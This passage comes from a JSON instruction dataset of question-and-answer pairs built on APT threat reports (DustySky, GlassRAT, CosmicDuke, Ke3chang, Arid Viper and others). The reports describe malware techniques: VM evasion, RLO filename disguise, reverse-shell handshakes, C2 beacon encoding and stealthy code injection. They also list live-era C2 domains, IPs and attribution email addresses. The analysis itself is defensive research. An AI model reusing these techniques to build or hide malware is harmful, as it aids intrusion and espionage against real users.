45.32.13.169.\nInterestingly, we found the fake domain imazing[.]ga mentioned in a job posting9 in the freelancers marketplace website freelancer.com. In the posting, the attackers claim they are looking for someone to\nbuild \"an application like that this website [sic]\" and entice the viewer to \"download application and take an overlook [sic]\" from imazing[.]ga and \"Let me know if any idea is missing or\u2026\".\n9 https://www.cz.freelancer.com/projects/iPhone/Write-some-Software-8755699/\nThis behavior deviates from the attackers' usual pattern of sending malicious email to selected (albeit many) individuals. It is unclear to us why they would go after random infections, but we can imagine various reasons, such as access to computers which would be used as proxies for attacks, or access to licenses for software owned by the victims.\nMedium Headline: Post infection\nThis section describes the actions performed by the attackers on infected computers we have investigated.\nAfter infecting the computer, the attackers used both the capabilities of DustySky, and those of public hacking tools they had subsequently downloaded to the computer.\nThey took screenshots and a list of active processes in the computer, and sent them to their command and control severs. They used BrowserPasswordDump10 , a public and free-to-use tool that recovers passwords saved in browsers. Below is the log file (empty in this case) that we recovered after the attackers had deleted it:\nThe malware would also scan the computer for files that contain certain keywords. The list of keywords, in base64 format, is retrieved from the command and control as a text file. For example:\nBelow are the encoded strings from the above image, decoded and translated:\n10 http://securityxploded.com/browser-password-dump.php\nThese words teach us what the attackers are after: personal documents; credentials, certificates and private keys; information pertaining to homeland security.\nMedium Headline: DustySky dropper\nThe DustySky dropper tries to evade running in a virtual machine. Once sure the computer is not a VM, it extracts, runs and adds persistency to DustySky Core. It extracts basic information about the operating system and checks for the existence of an Antivirus. It also extracts and opens the lure document.\nThe dropper's resources are two components that are dropped at run time. One is the lure document (internally called \"news\"), which is presented to the victim once the dropper is executed. The other is DustySky Core, a Trojan backdoor, (internally called \"log\").\nThe dropper uses the following function to obfuscate the name of functions and other parts of the malware (In later versions, SmartAssembly 6.9.0.114 .NET obfuscator was used):\nSo, for example, the following string:\nFor VM evasion the dropper checks whether there is a DLL that indicate that the malware is running in a virtual machine (vboxmrxnp.dll and vmbusres.dll which indicate vitualbox and vmGuestlib.dll which indicates vmware).\nIf the dropper is indeed running in a virtual machine, it will open the lure document and stop its activity:\nThe dropper uses Windows Management Instrumentation11 to extract information about the operating system and whether an antivirus is active.\nDustySky Core is dropped to %TEMP% and runs using either cmd or the .NET interface.\n1\n\u00a9 Clearsky - Cyber security.\nA registry entry is created for persistency after computer restart:\nMedium Headline: DustySky core\nDustySky Core is a Trojan backdoor and the main component of the malware. It communicates with the command and control server, exfiltrates collected data, information and files, and receives and executes commands.  It has the following capabilities:\n\uf0b7 Collecting information about the OS version, running processes and installed software.\n\uf0b7 Searching for removable media and network drives, and duplicating itself into them.\n\uf0b7 Extracting other components (such as the keylogging component) or receiving them from the command and control server, and running or removing them.\n\uf0b7 Evading virtual machines.\n\uf0b7 Turning the computer off or restarting it.\n\uf0b7 Making sure only a single instance of the malware is running.\nThe keylogging log file is uploaded to the server every 50 seconds. The files are uploaded via a POST request to a URL that ends with key.php.\n\nDescribe the tactics used by DustySky to target software developers and how the attackers distribute the malware through a fake website.",
    "output": "A: DustySky targets software developers by hosting a fake website that mimics a legitimate iOS management software called iMazing. The fake website, accessible through domains like imazing[.]ga, offers visitors to download a malicious version of the iMazing software. This version installs the legitimate iMazing software while simultaneously dropping DustySky as a file named Plugin.exe, which then communicates with its command and control servers. The attackers also posted a job listing on freelancer.com, enticing freelancers to download the malicious software from the fake website under the guise of evaluating it. This tactic deviates from their usual pattern of sending malicious emails to selected individuals and suggests an interest in gaining access to a broader range of computers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: BEHIND THE TERRACOTTA NODES\nWhere do the various Terracotta VPN providers obtain the resources to build such a vast VPN network? Out of 1500+ common VPN nodes, it is possible that some servers or appliances were legitimately obtained and leased by the Terracotta VPN operators. We will describe how others were clearly compromised.  RSA Research proposes three possible candidates (three devices) encompassing 557 IP addresses. We believe these devices are the best possible candidates for legitimate lease by the Terracotta VPN perpetrators for the following reasons:\n1. Massive multi-homing: The minimum quantity of IP addresses per suspected-legitimately-leased-device is 51. Terracotta services are marketed as very cost-effective, offering availability of a large VPN network for approximately $3/month. Massive multi-homing of a single device is apparently a method for inflating the appearance of the network. A Terracotta VPN client pings and displays all available nodes, noting both the date each node came online and its current response-time. However, while the network may appear to offer multiple new nodes on a given day, nodes with the same enlistment date and similar response-times actually indicate a multi-homed device. Further, network analysis shows the VPN clients usually connect to only a single IP address assigned to each massively multi-homed device. This may result in lower maintenance overhead, and indicates that the Terracotta VPN operator knows full-well that there is just one device behind the large pool of available nodes. And while there is no performance benefit from having the VPN clients ping multiple IP addresses from the same devices, doing so perpetuates the illusion of a larger network than what exists. When connecting to each of the nodes depicted in the client UI below (several nodes reflecting one of three multi-homed devices RSA Research has identified) the exit IP addresses are randomly assigned from the large pool of available IP addresses.\n2. No public services other than PPTP VPN.  In instances where RSA Research has confirmed the compromise of an organization, the victim organizations used their Internet-facing servers for various use cases, none of which included VPN or Windows Remote Access services. If these were compromised devices, we would expect the devices to be used by their legitimate owners for other purposes prior to being enlisted as Terracotta VPN nodes.  If, on the other hand, a legitimate VPN provider was compromised, we expect the operators to have noticed that their authentication process and client-base had been hijacked.\nA login splash screen (Figure 3) associated with the device with hostname 3819027EEA6E42F indicates the use of Windows Server 2003 Enterprise x64 Server, with Simplified Chinese locale or Chinese language pack. The latter would be the Windows locale most-commonly used by mainland PRC or Singapore residents.\nQuestion: What characteristics distinguish legitimately leased devices from compromised ones in the Terracotta VPN network, and how can these distinctions aid in identifying and mitigating such threats?",
    "output": "Answer: Legitimately leased devices in the Terracotta VPN network are characterized by massive multi-homing, where a single device is assigned a large number of IP addresses to give the impression of a larger network. Additionally, these devices typically offer no public services other than PPTP VPN, which is unusual for compromised devices that would normally be used for various purposes by their legitimate owners. Compromised devices, on the other hand, often show signs of being used for other services before being enlisted as VPN nodes. Understanding these distinctions helps cybersecurity professionals identify potentially compromised devices within their networks. By monitoring for unusual VPN activity and checking for the presence of other public services, security teams can better detect and respond to unauthorized use of their resources, thereby mitigating the risks associated with such compromises.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: GLASSRAT CAPABILITIES AND FUNCTIONS\nGlassRAT provides reverse shell functionality to an infected victim. The communication contains a handshake between the attacker and the victim. The sample will send the hard coded value 0x cb ff 5d c9 ad 3f 5b a1 54 13 fe fb 05 c6 22, the response from the C2 is then compared with the value 0x3f5ba154 and then the subsequent commands are a series of two byte codes. The malware performs a sanity check to make sure that the low byte of the two-byte combinations is 17 (0x11) or less. A QWORD is used to track directionality, and a DWORD is used to delimit data size. Control data is then passed to and from GlassRAT in the clear, such that system information and Windows command shell output would be readily observable in network traffic. GlassRAT initially accepts two primary commands (both with a set of sub commands) from its controller which are as follows:\n0x01: Provides/Enumerates system information from the victim host\n0x02: Native Command and reverse shell communications and output.\nThe initial beacon and handshake of controller-initiated C2 will pass the IP address of the victim to the GlassRAT controller.  However, this was not observed in our dynamic analysis, suggesting that it requires manual command from the C2 operator. Perhaps such commands are performed by the operator only if a connection by a nosy researcher has been ruled out.\nWhen the 0x01 primary command is issued the malware is configured with the following subcommands, which are in red.\n0x01 01 \u2013 C2 request for System Information\n0x01 02 \u2013 Victim response to request for system information\n0x01 03 \u2013 C2/Victim keep alive\n0x01 06 \u2013 C2 Read C:\\ProgramData\\off.dat\nWhen the 0x02 primary command is issued the malware is configured with the following subcommands. Not all of the 17 possibilities are utilized in the samples that were analyzed, and this could allow for future expansion of the malware's capabilities by its author(s).\n0x02 01 \u2013 C2 Cmd command\n0x02 02 \u2013 Victim Response from cmd commands\n0x02 03 \u2013 C2 initiate cmd.exe pipe/thread\n0x02 04 \u2013 C2 kill cmd pipe/thread\n0x02 05 \u2013 C2 execute file/start process\n0x02 06 \u2013 Not Used/present\n0x02 07 \u2013 Not Used/present\n0x02 08 \u2013 Victim response to file download \u2013 File not found\n0x02 09 \u2013 Not Used/present\n0x02 0A \u2013 Not Used/present\n0x02 0B \u2013 C2 command to get handle information\n0x02 0C \u2013 Download file from Victim\n0x02 0D \u2013 Victim response to file download \u2013 File transmission\n0x02 0E \u2013 Upload/write file to Victim\n0x02 0F \u2013 Not Used/present\n0x02 10 \u2013 C2 command to get handle information\n0x02 11 \u2013 Create process on Victim\n0x02 12 \u2013 Victim response to file upload\nBig Headline: COMMAND AND CONTROL\nTo perform dynamic analysis on the new dropper, RSA Research leveraged RSA Security Analytics (Figure 10) and RSA ECAT to quickly gather indicators and forensic details about the GlassRAT malware.\nRSA\u00ae ECAT (Figure 11) reveals that the Trojan is loaded as RasAuto service (via svchost.exe network service process) when installed with administrative privileges, and Figure 12 indicates detection by RSA\u00ae ECAT when installed with non-privileged credentials (rundll32.exe running the GlassRAT DLL).\nFigure 11 GlassRAT (administrative install) C2 as detected by RSA\u00ae ECAT\nAnalysts wishing to leverage RSA\u00ae ECAT to find RATs including GlassRAT in their enterprise networks may want to refer to the technical whitepaper \"Catching the R.A.T. with ECAT\"17 presented at RSA Charge by Justin Lamarre.\nRSA\u00ae Security Analytics reveals connections to following host aliases, which as of the time of this writing, resolve to the same IP address: 115.144.x.x in South Korea. The GlassRAT connects with the following string in the handshake.\ncb ff 5d c9 ad 3f 5b a1 54 13 fe fb 05 c6 22\nThe handshake protocol has been incorporated into a parser for RSA\u00ae Security Analytics (Figure 13) that is included in this report's annex, as well as on RSA\u00ae Live.\nEven without the parser (typical with a protocol-abusing raw socket connection) RSA\u00ae Security Analytics flags on \"unknown service over http port\" and \"unknown service over ssl port\" (Figure 14), cluing the security investigator to the probability that the traffic is malicious.\n17 http://charge.rsa.com/wp-content/uploads/2015/09/Finding-The-R.A.T-With-ECAT.pdf\nFigure 14 GlassRAT protocol abuse identified by Security Analytics\nIn each case, the Trojan dropper installed the DLL with the file pointer hard coded to be 12 megabytes in size. Thus, although the functional part of the GlassRAT DLL is only 16kb or so in size, the file size shown on disk is much larger (Figure 15).\n\nHow does GlassRAT establish a reverse shell connection with its Command and Control (C2) server, and what measures does it use to ensure the integrity of the communication?",
    "output": "GlassRAT establishes a reverse shell connection through a handshake process where the malware sends a hard-coded value (0x cb ff 5d c9 ad 3f 5b a1 54 13 fe fb 05 c6 22) to the C2 server. The C2 server responds with another value (0x3f5ba154), which the malware compares to verify the authenticity of the connection. Subsequent commands are sent as a series of two-byte codes, with a sanity check ensuring that the low byte of these combinations is 17 (0x11) or less. A QWORD tracks directionality, and a DWORD delimits data size. Control data is passed in the clear, making system information and command shell output observable in network traffic.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: SCOPE\nWe have seen dozens of Cosmu samples that share code with MiniDuke. Rather than cover the entire spectrum of samples, the scope of this analysis was intentionally limited to highlighting the most interesting of the recent samples. This includes examining the attack files used to infect targets, the remote servers storing data collected from the victims and the differences between the MiniDuke loaders and Cosmu info-stealers used in the samples.\nMedium Headline: ARRIVAL\nAt this time, we have no information on how the CosmicDuke attack files are delivered to the victims, though based on the findings from the analysis, we can make an educated guess.\nIt is possible that the PDF documents containing exploits were emailed to the targeted users as file attachments. Assuming that the email gateway used by the victims does not include an antivirus solution capable of identifying the exploit, such files would have little impediment to being spread by email.\nIt is however unlikely that the samples which camouflaged the executable files as image or document files would be distributed in the same way. Regardless of any tricks played with the filenames, the files themselves are Windows executables, and many email solutions today prevent users from opening attached executable files.\nMedium Headline: INFECTION\nThe attackers are using at least two different methods for infecting the systems: exploits and social engineering.\nDOCUMENT-BASED EXPLOIT\nCosmicDuke malware samples that use exploits to gain entry onto a target system (referred to as exploit files in the rest of this document) start with a malicious Flash object embedded into a PDF file. When the file is launched, the object exploits the known CVE-2011-0611 vulnerability in specific versions of Adobe Flash, Reader and Acrobat products.\nUnlike the CosmicDuke files geared towards social engineering, the exploit files do not actually display any documents to the user as a form of distraction; the malware simply straightaway exploits the vulnerability.\nSOCIAL ENGINEERING\nLess technically challenging CosmicDuke samples use simple social engineering to trick the user into willingly launching the attack file. Once launched, the file drops the malware onto the system (such files are therefore referred to as droppers in the rest of this documents).\nTo do so, the malware's executable file is first disguised as an image or document to make it seem innocuous. When launched, a document or image is displayed in order to draw the user's attention away from any background activity. In the meantime, the malware's malicious files are silently installed and executed on the system.\nBig Headline: TECHNICAL DETAILS\nCosmicDuke samples can be divided into 3 distinct groups based on similarities between the C&C servers they contact, file characteristics and decoy document used. The full details of how the samples were grouped is listed on page 11; Figure 2 at left provides a quick summary of the grouping as they relate to how CosmicDuke is delivered, and the decoy documents shown.\nThe first group of samples (Group #1) is spread using 3 dropper files that display specific decoy documents. The second sample group (Group #2) uses both exploit-loaded files and dropper files. The third group (Group #3) is rather an exception, as it does not use the droppers or exploits listed here; for the sake of simplicity, we will exclude considering Group #3's delivery method.\nMedium Headline: DROPPER: RLO\nCosmicDuke's author(s) disguised the fact that the malware is an executable file by using the Right-to-Left Override (RLO) feature in Windows to hide the file's correct file extension, .exe or .scr, and replace it with .jpg, .pdf or .doc, in order to make the file appear to be an innocuous document or image.\nImage 1 is a screenshot of how the filenames look like in Windows 7. The real file extension for the top four files is .scr, while the real extension for the bottom one is .exe.\nNote that the attacker has also carefully changed the icon of the executable to reflect the fake filetype for the first four.\nThe bottom file is a curious exception, as it does not use a PDF icon as would be expected with a .pdf file extension; instead, it uses an NVIDIA icon, most likely to reflect the fact that the product name of the executable is listed as \"NVIDIA Update Components\" in the file's version information. This seems to be a common fake product name used in the latest Cosmu samples. Meanwhile, the\nfilename readily visible to the users is translated from Turkish as \"civilian crisis center status report\".\nThe use of RLO is a smart move from the attackers. Why go through the trouble of exploiting anything if you can simply trick the user into double-clicking an executable that looks a lot like a document file?\nAs the screenshot demonstrates, unchecking \"Hide extensions for known filetypes\" does not help. The three-letter file extensions seen at the end of the filename is not the real file extension. Even though the information in the Type column is correct, most of the users probably do not even check it.\nMedium Headline: DROPPER: DECOYS\nCosmicDuke dropper files all display some kind of a decoy document or image to distract the user when the attack file is launched.\nThe following are the droppers used by Group #1. Here are the filenames of the decoys, as displayed in Windows, and the decoy images or files they show when launched:\ny rcs.\u0417\u0430\u043a\u0430\u0437.doc\ny rcs.18.jpg\ny rcs.DSC_1365527283.jpg\n- Image 2\n- Image 3\n- Image 4\nThe decoys are interesting. \u0417\u0430\u043a\u0430\u0437 means \"order\" in Russian. Based on the characters \u0421\u0416\u0421-1295 and \u0413\u0425\u0420\u041f found in the decoy, the document looks like an order for growth hormones. The document contains full delivery address, including the name of the person placing the order.\nAn interesting detail about the image file of a receipt (Image 3) shown by rcs.18.jpg is that it contains EXIF metadata, including the date when the photo was taken and the model of the mobile phone that was used to take the photo. Part of this EXIF metadata is shown in Image 3a.\nThe third dropper file we've seen uses the filename 'rcs. Ukraine-Gas-Pipelines-Security-Report-March-2014.pdf', and displays the decoy document shown in Image 6. This particular dropper file is notable in that its info-stealer (SHA1:f513b21738ae3083d79e4fa1039889e1c3efff58) is the same one used by the exploit file named \"Bulletin-PISM-No-31-(625)-March-10-2014.pdf\".\nImage 3: Decoy shown by rcs.18.jpg\nImage 3a: EXIF metadata for file from image 3\nImage 2: Decoy shown  by rcs.\u0417\u0430\u043a\u0430\u0437.doc\nImage 6: Decoy document shown by  rcs.Ukraine-Gas-Pipelines-Security-Report-March-2014.pdf\nImage 4: Decoy shown by rcs.DSC_1365527283.jpg\nMedium Headline: EXPLOIT\nThe code used by CosmicDuke to exploit the CVE-2011-0611 vulnerability appears to be derived from this proof-of-concept code that was made available in early 2011:\ny\nhttp://www.exploit-db.com/exploits/17473/\nThe samples we analyzed of the exploit-based CosmicDuke variety had the file names and SHA1 values listed in Figure 3 at right (see \"Appendix A | Samples\" for more details).\nSome of these exploit files have interesting filenames, such as \"dip.mail march.pdf\" and \"Bulletin-PISM-No-31-(625)-March-10-2014.pdf\". The PISM mentioned in the latter presumably refers to the Polish Institute of International Affairs [1] .\nFIGURE 3: FILENAMES AND SHA1 VALUES OF COSMICDUKE EXPLOIT FILES\nMedium Headline: LOADER: MINIDUKE 3RD STAGE\nThe CosmicDuke samples we analyzed used the same loader as MiniDuke's stage 3 [2] samples, making this the first occasion in which we've seen other malware using this particular loader.\nThe parallel usage of the loader in the CosmicDuke and MiniDuke families is interesting. The oldest samples we have of this loader that loads Cosmu malware show the compilation date of the loader as March 24 2011, which predates the oldest publicly documented MiniDuke sample (with a recorded loader compilation date of June 18 2012). The earlier use of the loader with a Cosmu payload leads us to suspect the existence of a link between the author(s) of Cosmu and MiniDuke.\nThe most common compilation date seen for the loaders that load the Cosmu malware is November 13 2012. Perhaps coincidentally, we found one MiniDuke sample (originally reported by CrySys [3]) that also shows the same compilation date. In this case however, the MiniDuke component is actually a downloader; it connects to an IP address in Turkey, and when it receives a response, decrypts and executes it.\nAlso of interest is that once the MiniDuke loader was updated, we saw CosmicDuke samples take the updated loader into use in mid-April 1 2014, a few months after MiniDuke started using the latest loader in mid-December 2013. It seems possible that the actors behind the two malware families share code and/or tools.\nFIGURE 4: MILESTONES IN PARALLEL LOADER USE*  IN COSMU AND MINIDUKE FAMILIES\n1.  Polish Institute of International Affairs; http://www.pism.pl/en\n2. CIRCL - Computer Incident Response Center Luxembourg; Analysis of a stage 3 Miniduke sample; published 30 May 2013; http://www.circl.lu/assets/files/tr-14/circl-analysisreport-miniduke-stage3-public.pdf\n3.  Laboratory of Cryptography and System Security (CrySyS Lab); MiniDuke: Indicators; published 27 February 2013; http://www.crysys.hu/miniduke/miniduke_indicators_public.pdf\n\nWhat vulnerability does the CosmicDuke malware exploit in its document-based attacks, and how does it differ from the social engineering approach?",
    "output": "CosmicDuke exploits the CVE-2011-0611 vulnerability in specific versions of Adobe Flash, Reader, and Acrobat products. Unlike the social engineering approach, the exploit files do not display any documents to the user as a distraction; instead, the malware immediately exploits the vulnerability upon opening the PDF file. This method relies on technical exploitation rather than deceiving the user into manually launching the malware.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: Targeting\nTraditionally, the Ke3chang attackers have used spear-phishing emails with either a malware attachment or a link to a malicious download. They have also leveraged a Java zero-day vulnerability (CVE-2012-4681), as well as older, reliable exploits for Microsoft Word (CVE-2010-3333) and Adobe PDF Reader (CVE-2010-2883). The Ke3chang attackers have also sent Windows screensaver files (.scr) and executable files (.exe) using the Unicode Right-To-Left-Override (RTLO) technique to cloak the original filename extension from the targeted user.4 In addition to the recent Syria-themed campaign, they also used a London Olympics-themed campaign in 2012 and one that involved former model and French first lady Carla Bruni in 2011.\n4 Ke3chang used the Java vulnerability (CVE-2012-4681) before a patch was available. Krebs, B. \"'Right-to-Left Override' Aids Email Attacks\". September 2011.\nMedium Headline: Malware analysis and timeline\nOver the years, the Ke3chang attackers have used three types of malware that we call: \"BS2005\", \"BMW\", and \"MyWeb\". We believe these three types of malware are an evolution of a single project from a single developer or small team of developers sharing code. Functionally, it is a typical first stage backdoor commonly found in APT attacks. It has the ability to upload and download files, run shell commands, and sleep for a configurable length of time. All of the CnC communications are performed over the HTTP protocol.\nThe current Ke3chang campaign leverages the BS2005 malware, while older activity from 2010-2011 leveraged BMW, followed by the MyWeb malware sporadically used in between.\nBS2005: Oct 2011 \u2013 present (most recent)\nBS2005 campaign: \"moviestar\"\nJust as the media began to report on possible U.S. military intervention in Syria, the Ke3chang attackers began to use this topic as a lure to trick their targets into running their malware. Although attackers routinely employ breaking news as lures, the targets of this campaign, codenamed by Ke3chang as \"moviestar\", were various ministries of foreign affairs in Europe.\nThe malware used in this most recent campaign is known as \"BS2005\". One sample was located in a ZIP file named \"US_military_options_in_Syria.zip\" (6cb633b371700d1bd6fde49ab38ca471) and contained the file \"US_military_options_in_Syria.pdf.exe\" (b68a16cef982e6451ddf26568c60833d). This executable is a \"loader\" that contains the process debugging (PDB) string:\nc:\\BS2005\\BS2005\\release\\Loader.pdb\nUpon execution, the loader drops another executable \"ie.exe\" (277487587ae9c11d7f4bd5336275a906) that contains the following PDB string:\nc:\\BS2005\\BS2005\\release\\IE.pdb\nThis executable has a compile date of 2013/07/25 and BS2005 is the most recent iteration of the backdoor. Upon execution of \"ie.exe\", it beacons to a CnC host, named cascais.epac.to (IP: 122.10.83.51), with the following HTTP traffic pattern:\nPOST /p3oahin/<filename>.aspx?r=<Base64 Encoded Data>=&a= HTTP/1.1\nAccept: */*\nAccept-Language: en-us\nUA-CPU: x86\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)\nHost: cascais.epac.to\nContent-Length: 4\nConnection: Keep-Alive\nSmall Headline: <Base64 Encoded Data>\nAlthough this sample uses the \"/p3oahin/\" path, we have observed earlier samples that used the path \"/ke3chang/\" and \"/shfam9y/.\" The sample we analyzed randomly chooses the <filename> to use in the URL from the following hard-coded list:\n\u2022 albumtop.aspx\n\u2022 blogvideo.aspx\n\u2022 celebrity.aspx\n\u2022 modules.aspx\n\u2022 newpage.aspx\n\u2022 pratty.aspx\n\u2022 tieback.aspx\n\u2022 ugctag.aspx\n\u2022 verycd.aspx\n\u2022 worldcat.aspx\nIn addition, each sample contains a mark or campaign tag, embedded in the Base64 callback payload that allows the attackers to keep track of their various campaigns. In this case, the mark in the Syria-themed iteration of this campaign was consistently the \"moviestar\" tag.\nEach byte of the CnC data goes through the following transformation:\n\u2022 The data has 0x27 plus its positional index number added to it\n\u2022 It is then XOR'd with its positional index number\n\u2022 This data is then Base64 encoded, with '+' characters being replaced with '*' characters when the data is transmitted as a parameter in the URL\nThe Base64 data for the 'r' parameter decodes and decrypts to the following data format:\n<Local IP address>\n<Computer name>\n<Domain>\n<Campaign marker>\n<Date/Time>\n<Command identifier>\n<Volume serial number>\n<yes/no/nn>\n<empty line>\n<empty line>\nIn this format, the <yes/no/nn> indicates whether more data is available for command output or file upload. An \"nn\" refers to NOP/NOOP (\"NO OPeration\"\u2014a beacon signal).\nVarious versions of the BS2005 malware will use a different constant for the addition part of the encryption routine and contain other information, such as the following:\n\u2022 Installed mail client\n\u2022 Internet Explorer version\n\u2022 Windows version\n\u2022 Whether a proxy server is configured\n\u2022 Whether a virtual machine was detected\nIn addition to the Base64 data in the URI of the HTTP POST, the BS2005 malware also includes Base64 data in the body of the HTTP POST. The Base64 data for the POST body decodes and decrypts to one of the following: \"no,\" uploaded file content, or the output from the previous command.\nOnce the HTTP POST completes, the response is an HTML page with a hidden form (see Figure 3). A particular string sequence is expected, which contains a command ID and delimited parameters. All three malware families that FireEye analyzed (BS2005, MyWeb, and BMW) follow a similar CnC pattern in their HTTP replies.\nAt least one of the BS2005 samples contained a simple anti-virtual machine heuristic. Specifically, the GetTickCount function is called and a loop is executed 999,999,990 times that simply increments a variable. After this loop completes, GetTickCount is called again and the values are compared. If they are the same, the process terminates.\nA trait common to all three malware families we analyzed is that they use the IWebBrowser2 COM interface to perform their CnC communication. This programming interface allows the programmer to reuse code from an existing browser (typically Internet Explorer) to perform Web browsing, simplifying the development process. The network communication is actually performed through the browser process, causing some misdirection when it comes to determining which process is ultimately responsible for generating this network traffic. This technique is nothing new for malware, but FireEye did notice something interesting in BS2005's behavior.\nBS2005 attempts to kill any processes named \"maxthon.exe\" or \"360se.exe.\" The \"360se.exe\" process seems to make sense, because it relates to 360 Chinese anti-virus software. But why the malware would be programmed to terminate Maxthon, a free browser developed by a Chinese company, was initially unclear.\nUpon further investigation, we found that if a Maxthon browser is open while the BS2005 malware uses this IWebBrowser2 COM interface to navigate to a Web page, the Maxthon browser opens a new tab and visibly navigates to the Web page itself. Instead of using other APIs to make Web requests and read responses, the BS2005 developer apparently dealt with this issue by simply killing any Maxthon browser processes running on the target computer. This lack of sophistication is present throughout the code in all three malware families (BS2005, MyWeb, and BMW). BS2005 is actually the most complex of the three, which makes sense given that it is the most recent malware family we have seen.\nImprovements in the BS2005 version of the malware include a \"sleep until date/time\" command and weak encryption for all CnC data; previous iterations (MyWeb and BMW) did not encrypt the host information sent in the beacon.\n\nHow does the Ke3chang APT group leverage social engineering techniques in their attacks, and what are some examples of past themes they have used?",
    "output": "The Ke3chang attackers primarily use spear-phishing emails with either a malware attachment or a link to a malicious download. They often leverage breaking news topics as lures to trick their targets into running their malware. Examples of past themes include a Syria-themed campaign in 2013, a London Olympics-themed campaign in 2012, and one involving former model and French first lady Carla Bruni in 2011.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the key differences between sKyWIper and Duqu (Stuxnet) in terms of code injection techniques, and why is sKyWIper's method considered stealthier?",
    "output": "Duqu's authors used ZwCreateSection() and ZwMapViewOfSection() to copy code into running processes, while other methods use LoadLibrary() and LoadLibraryEx() to load a library into a code. These techniques can easily be detected as the inserted DLLs appear in the PEB's InLoadOrderModuleList. In contrast, sKyWIper's code injection mechanism is stealthier because the presence of the code injection cannot be determined by conventional methods such as listing the modules of the corresponding system processes (winlogon, services, explorer). The only trace found initially is that certain memory regions are mapped with the suspicious READ, WRITE, and EXECUTE protection flags, and they can only be grasped via the Virtual Address Descriptor (VAD) kernel data structure. These regions must have been allocated dynamically by means of VirtualAllocEx() or WriteProcessMemory(), and they have the type of Vad Short. Thus, the combination of RWE flags and type VadS for a given memory region in a system process allowed the identification of the code injection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nSmall Headline: C&C Infrastructure\nUsing an initial malware sample and its corresponding C&C server, we looked through internal Trend Micro databases to compile a list of similar malware that contact the same server. All cases revealed that the malware essentially exhibited the same behaviors previously outlined.\nThe first C&C server found was pstcmedia.com. A quick search revealed that another site\u2014mixedwork.com\u2014hosted on the same IP address\u2014188.40.81.136\u2014also acted as a C&C server. Although the pstcmedia.com site changed IP addresses, mixedwork.com seemed to stay on this IP address. The other IP addresses pstcmedia.com used include 192.254.132.26 and 54.255.143.112. The second IP address has been sink-holed by other security researchers.\nTo find other domains that may be part of the same campaign or used by the same perpetrators, an investigation of domain registration data was conducted. The C&C server that pstcmedia.com used was registered using the personal email address, khalid.samraa@gmail.com. More details on this can be found in the attribution section.\nThe main page of mixedwork.com also contained a decoy redirection to the legitimate site, http://channel9.msdn.com/events/mix. But on its 404 page, it is interesting to note the mention of the email address, ahmed. jmal1989@gmail.com, as site administrator.\nAn in-depth look at Trend Micro\u2122 Smart Protection Network\u2122 feedback for network activity similar to the previously mentioned URL paths allowed us to identify where the following active C&C servers were at various times:\n\u2022 ahmedfaiez.info\n\u2022 flushupdate.com\n\u2022 flushupate.com\n\u2022 ineltdriver.info\n\u2022 mediahitech.com\nThe first three servers have all been hosted at some point on the same IP addresses\u2014188.40.75.132 and 188.40.106.84\u2014located in Hetzner, Germany. A more in-depth look at the first IP address revealed that among several other domains, it also hosts two\u2014advtravel.info and fpupdate.info\u2014that have clear ties to cybercriminal activities although not necessarily to the same campaign being investigated.\nA closer look at the last two C&C servers revealed that they have been misconfigured and allowed directory listing. Inside them were large amounts of victim data analyzed in the Operation Advtravel section.\nMaltego\u00ae map showing the relationships among the sites, IP addresses, and servers seen in the featured campaigns\nOperation Arid Viper's main C&C servers have been configured so their main pages redirected visitors to other web pages as shown in the table below.\nA check of the Domain Name System (DNS) Start of Authority (SOA) and Whois records of each identified C&C server turned up several other interesting email addresses, more details on all of which can be found in the attribution section. The table below shows our findings.\nNote that C&C server names marked with * are part of a separate campaign\u2014Advtravel.\nThe malware binary hashes and their respective C&C servers, along with the dates they were first seen, allowed us to create a timeline of attacks that shows how much Operation Arid Viper has evolved over time.\n\nIn Operation Arid Viper, how did the researchers identify additional C&C servers and what methods were used to confirm their involvement in the campaign?",
    "output": "Researchers identified additional C&C servers by looking through internal Trend Micro databases for similar malware that contacted the same server as the initial sample. They found that the first C&C server, pstcmedia.com, shared an IP address with mixedwork.com, which also acted as a C&C server. Further investigation involved analyzing domain registration data, where they found that pstcmedia.com was registered using the email address khalid.samraa@gmail.com. Additionally, the 404 page of mixedwork.com mentioned the email address ahmed.jmal1989@gmail.com as the site administrator. By examining Trend Micro\u2122 Smart Protection Network\u2122 feedback for network activity similar to the previously mentioned URL paths, researchers identified other active C&C servers such as ahmedfaiez.info, flushupdate.com, flushupate.com, ineltdriver.info, and mediahitech.com. These servers were confirmed to be part of the campaign based on their hosting locations and configurations, including misconfigurations that allowed directory listing, revealing large amounts of victim data.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Background of Operation Pawn Storm\nThe actors of Pawn Storm tend to first move a lot of pawns in the hopes they come close to their actual, high profile targets. When they finally successfully infect a high profile target, they might decide to move their next pawn forward: advanced espionage malware.\nThe iOS malware we found is among those advanced malware. We believe the iOS malware gets installed on already compromised systems, and it is very similar to next stage SEDNIT malware we have found for Microsoft Windows' systems.\nWe found two malicious iOS applications in Operation Pawn Storm. One is called XAgent (detected as IOS_XAGENT.A) and the other one uses the name of a legitimate iOS game, MadCap (detected as IOS_ XAGENT.B). After analysis, we concluded that both are applications related to SEDNIT.\nThe obvious goal of the SEDNIT-related spyware is to steal personal data, record audio, make screenshots, and send them to a remote command-and-control (C&C) server. As of this publishing, the C&C server contacted by the iOS malware is live.\nRead the text above and answer this question: In the context of Operation Pawn Storm, how does the iOS malware relate to the broader strategy of the SEDNIT group, and what specific functionalities does it employ to achieve its objectives?",
